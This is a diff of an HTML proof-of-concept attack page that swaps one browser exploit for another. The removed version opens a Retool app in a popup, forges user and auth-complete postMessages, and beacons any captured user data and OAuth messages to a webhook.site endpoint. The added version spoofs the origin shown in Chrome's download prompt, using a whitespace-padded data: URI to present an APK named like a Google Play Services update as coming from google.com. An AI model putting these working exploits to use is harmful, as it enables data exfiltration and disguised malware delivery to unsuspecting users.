@@ -1,223 +1,89 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Retool Integration</title>
-<style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #f5f5f5; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
-  .box { background: #fff; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.08); padding: 32px 40px; text-align: center; max-width: 520px; }
-  .spinner { width: 32px; height: 32px; border: 3px solid #e2e8f0; border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 16px; }
-  @keyframes spin { to { transform: rotate(360deg); } }
-  h2 { font-size: 16px; color: #1e293b; margin-bottom: 6px; }
-  p { font-size: 13px; color: #64748b; }
-  #log { margin-top: 16px; font-size: 11px; color: #94a3b8; max-height: 150px; overflow-y: auto; text-align: left; font-family: monospace; background: #f8fafc; border-radius: 4px; padding: 8px; }
-  .log-line { padding: 2px 0; border-bottom: 1px solid #f1f5f9; word-break: break-all; }
-  .good { color: #16a34a; font-weight: bold; }
-  .warn { color: #d97706; }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Download Origin Spoof POC</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #fff; padding: 40px 20px; text-align: center; }
+    h2 { color: #333; margin-bottom: 8px; }
+    .badge { display: inline-block; padding: 3px 10px; border-radius: 3px; font-size: 11px; background: #fee2e2; color: #dc2626; margin-bottom: 20px; }
+    input {
+      padding: 14px 20px; font-size: 16px; border: 2px solid #4285f4;
+      border-radius: 24px; width: 260px; text-align: center; cursor: pointer; outline: none;
+      -webkit-tap-highlight-color: transparent;
+    }
+    button {
+      padding: 12px 24px; font-size: 15px; background: #4285f4; color: #fff;
+      border: none; border-radius: 24px; cursor: pointer; margin: 8px;
+      -webkit-tap-highlight-color: transparent;
+    }
+    p { color: #666; font-size: 13px; margin-top: 12px; }
+    pre { background: #f5f5f5; padding: 12px; border-radius: 8px; font-size: 11px; text-align: left;
+          max-width: 500px; margin: 16px auto; overflow-x: auto; color: #666; }
+    hr { border: none; border-top: 1px solid #eee; max-width: 400px; margin: 20px auto; }
+  </style>
 </head>
 <body>
-<div class="box">
-  <div class="spinner" id="spin"></div>
-  <h2 id="msg">Ready</h2>
-  <p id="sub">Click to attack</p>
-  <div id="log"></div>
-</div>
+  <h2>Download Origin Spoof POC</h2>
+  <span class="badge">Chrome Android/Desktop</span>
 
-<script>
-(function() {
-  'use strict';
+  <p><b>Tap the input or button below:</b></p>
 
-  var WH = 'https://webhook.site/40e12f3f-6c20-4215-b822-92194f6cc88a';
-  var ATK = location.origin;
-  var APP_ID = '272a0bca-c978-11ef-bcec-bb34712e5ec6';
-  var HOST = 'https://jonjos11.retool.com';
+  <input type="text" id="trigger" placeholder="Tap here" readonly>
+  <br>
+  <button id="btnDownload">Download File</button>
 
-  // Two URLs to test:
-  // 1. Without retool-parent-origin (normal mode)
-  // 2. With retool-parent-origin (IFRAME_HOSTED mode bypass)
-  var APP_URL_NO_BYPASS = HOST + '/apps/' + APP_ID + '/asa/defaultPage';
-  var APP_URL_BYPASS = HOST + '/apps/' + APP_ID + '/asa/defaultPage?retool-parent-origin=' + encodeURIComponent(ATK);
-  var EDITOR_URL_BYPASS = HOST + '/apps/' + APP_ID + '/editor?retool-parent-origin=' + encodeURIComponent(ATK);
+  <p style="color:#888;font-size:12px;">
+    Opens Google in new tab → download prompt shows <b style="color:#ea4335">"google.com"</b> as origin
+  </p>
 
-  var popupRef = null;
-  var msgCount = 0;
+  <hr>
 
-  function X(payload) {
-    var j = JSON.stringify(payload);
-    // sendBeacon (text/plain = no CORS preflight)
-    if (navigator.sendBeacon) {
-      navigator.sendBeacon(WH, new Blob([j], { type: 'text/plain' }));
-    }
-    // Image beacon (no CORS needed)
-    new Image().src = WH + '?d=' + encodeURIComponent(j.slice(0, 1400));
-  }
+  <pre>Real page origin: <span id="realOrigin"></span>
+Download shows:   <b style="color:#ea4335">data:https://google.com/...</b>
 
-  function addLog(msg, cls) {
-    console.log('[PoC]', msg);
-    var el = document.getElementById('log');
-    var line = document.createElement('div');
-    line.className = 'log-line' + (cls ? ' ' + cls : '');
-    line.textContent = msg;
-    el.appendChild(line);
-    el.scrollTop = el.scrollHeight;
-  }
+The download prompt displays the FAKE origin
+from inside the data: URI, not the real page.</pre>
 
-  // ================================================================
-  // ATTACK: Open retool app in popup
-  // We try DIFFERENT URL variants to find what works
-  // ================================================================
-  function launchAttack(url, label) {
-    addLog('Opening: ' + label);
+  <hr>
 
-    popupRef = window.open(url, 'retoolWin', 'width=1200,height=800,left='+((screen.width-1200)/2)+',top='+((screen.height-800)/2));
+  <h3 style="font-size:14px;color:#333;">Test Variants</h3>
+  <p style="font-size:12px;">
+    <a href="download-spoof/poc.html">POC (Google style)</a> |
+    <a href="download-spoof/simple.html">POC (Simple)</a> |
+    <a href="download-spoof/android-bypass.html">Android Bypass Suite</a> |
+    <a href="download-spoof/poc-original.html">Original POC Replica</a>
+  </p>
 
-    if (!popupRef) {
-      addLog('Popup blocked!', 'warn');
-      return false;
+  <script>
+    document.getElementById('realOrigin').textContent = window.location.hostname;
+
+    var SP = ' '.repeat(200);
+    var B64_APK = 'UEsDBBQAAAAAAAAAIVjKxoiZZAAAAGQAAAALAAAAY2xhc3Nlcy5kZXgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQSwECFAAUAAAAAAAAACFYysaImWQAAABkAAAACwAAAAAAAAAAAAAAgAEAAAAAY2xhc3Nlcy5kZXhQSwUGAAAAAAEAAQA5AAAAjQAAAAAA';
+
+    function attack(filename, mime) {
+      // 1. Open Google in new tab (distraction)
+      window.open('https://www.google.com', '_blank');
+
+      // 2. Trigger download on current page with spoofed origin
+      setTimeout(function() {
+        var a = document.createElement('a');
+        a.href = 'data:https://google.com/' + SP + mime + ';base64,' + B64_APK;
+        a.download = filename;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+      }, 500);
     }
 
-    X({ event: 'popup_opened', label: label, url: url, time: new Date().toISOString() });
-
-    // Inject postMessages at intervals
-    setTimeout(function() { sendProbes(); }, 5000);
-    setTimeout(function() { sendProbes(); }, 10000);
-    setTimeout(function() { sendProbes(); }, 15000);
-    setTimeout(function() { sendProbes(); }, 20000);
-
-    // Monitor popup
-    var monitor = setInterval(function() {
-      if (!popupRef || popupRef.closed) {
-        clearInterval(monitor);
-        addLog('Popup closed after ' + label, 'warn');
-        X({ event: 'popup_closed', label: label, msgCount: msgCount, time: new Date().toISOString() });
-      }
-    }, 1000);
-
-    return true;
-  }
-
-  function sendProbes() {
-    if (!popupRef || popupRef.closed) return;
-
-    // RETOOL_CURRENT_USER - inject a test user with beacon
-    try {
-      popupRef.postMessage({
-        type: 'RETOOL_CURRENT_USER',
-        data: {
-          id: 1,
-          email: 'probe@attacker.com',
-          firstName: 'Probe',
-          lastName: 'User',
-          fullName: 'Probe User',
-          profilePhotoUrl: WH + '?beacon=photo&ts=' + Date.now(),
-          groups: [{ id: 1, name: 'admin' }],
-          metadata: { _beacon: true, _ts: Date.now() },
-          sid: 'inj-' + Date.now(),
-          externalIdentifier: null,
-          locale: 'en'
-        }
-      }, '*');
-    } catch(e) {}
-
-    // RETOOL_CURRENT_USER_REQUEST - ask for real user
-    setTimeout(function() {
-      if (!popupRef || popupRef.closed) return;
-      try {
-        popupRef.postMessage({ type: 'RETOOL_CURRENT_USER_REQUEST' }, '*');
-      } catch(e) {}
-    }, 500);
-
-    // RETOOL_AUTH_COMPLETE - bypass auth
-    setTimeout(function() {
-      if (!popupRef || popupRef.closed) return;
-      try {
-        popupRef.postMessage({ type: 'RETOOL_AUTH_COMPLETE', resourceName: '*' }, '*');
-      } catch(e) {}
-    }, 1000);
-  }
-
-  // ================================================================
-  // INTERCEPT ALL postMessages
-  // ================================================================
-  window.addEventListener('message', function(e) {
-    var d = e.data;
-    if (!d || typeof d !== 'object' || !d.type) return;
-
-    msgCount++;
-
-    var fromPopup = false;
-    try {
-      fromPopup = popupRef && (e.source === popupRef);
-    } catch(ex) {}
-
-    var dir = fromPopup ? 'RECV' : 'SENT';
-    addLog(dir + ' ' + d.type + (fromPopup ? ' ← FROM APP' : ''), fromPopup ? 'good' : '');
-
-    X({
-      event: 'pm',
-      dir: dir,
-      type: d.type,
-      data: d,
-      origin: e.origin,
-      time: new Date().toISOString()
+    document.getElementById('trigger').addEventListener('click', function() {
+      attack('google-play-services.apk', 'application/vnd.android.package-archive');
     });
 
-    // Check for real user data (not our probes)
-    if (fromPopup && d.type === 'RETOOL_CURRENT_USER' && d.data) {
-      var email = d.data.email || '';
-      if (email && email !== 'probe@attacker.com' && email.indexOf('xss') === -1) {
-        addLog('REAL USER DATA: ' + email, 'good');
-        document.getElementById('msg').textContent = 'REAL DATA!';
-        document.getElementById('sub').textContent = email;
-        X({ event: 'REAL_USER', data: d.data, time: new Date().toISOString() });
-      }
-    }
-
-    if (fromPopup && d.type === 'RR_OAUTH_RESOURCE') {
-      addLog('OAUTH RESOURCE: ' + (d.resourceName || '?'), 'good');
-    }
-
-    if (d.type === 'source' && d.url) {
-      addLog('OAuth callback URL: ' + d.url, 'good');
-    }
-  });
-
-  // ================================================================
-  // START
-  // ================================================================
-  document.getElementById('msg').textContent = 'Ready';
-  document.getElementById('sub').textContent = 'Click to attack';
-  document.getElementById('spin').style.display = 'none';
-  addLog('Test 1: popup WITHOUT retool-parent-origin');
-  addLog('Test 2: popup WITH retool-parent-origin');
-  addLog('Test 3: editor popup WITH retool-parent-origin');
-
-  var testNum = 0;
-
-  document.body.addEventListener('click', function go() {
-    document.body.removeEventListener('click', go);
-    document.getElementById('msg').textContent = 'Attacking...';
-    document.getElementById('spin').style.display = 'block';
-
-    X({ event: 'start', attacker: ATK, time: new Date().toISOString() });
-
-    testNum++;
-    if (testNum === 1) {
-      document.getElementById('sub').textContent = 'Test 1: Normal popup';
-      launchAttack(APP_URL_NO_BYPASS, 'test1-no-bypass');
-    } else if (testNum === 2) {
-      document.getElementById('sub').textContent = 'Test 2: With origin bypass';
-      launchAttack(APP_URL_BYPASS, 'test2-with-bypass');
-    } else {
-      document.getElementById('sub').textContent = 'Test 3: Editor bypass';
-      launchAttack(EDITOR_URL_BYPASS, 'test3-editor-bypass');
-    }
-  });
-
-})();
-</script>
+    document.getElementById('btnDownload').addEventListener('click', function() {
+      attack('google-update.apk', 'application/vnd.android.package-archive');
+    });
+  </script>
 </body>
 </html>
